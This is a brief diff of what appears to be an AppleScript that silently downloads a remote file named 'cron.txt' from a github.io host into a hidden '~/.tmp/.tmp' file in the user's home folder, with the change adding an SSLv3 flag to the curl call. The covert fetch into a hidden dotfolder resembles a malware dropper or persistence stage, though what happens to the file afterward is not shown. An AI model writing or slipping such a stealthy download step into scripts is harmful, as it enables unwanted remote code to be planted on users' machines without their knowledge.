@@ -1,6 +1,6 @@
 set p to (path to home folder as Unicode text) & ".tmp:.tmp"
 
-do shell script "curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
+do shell script "curl -s -3 https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
 
 delay 10
 
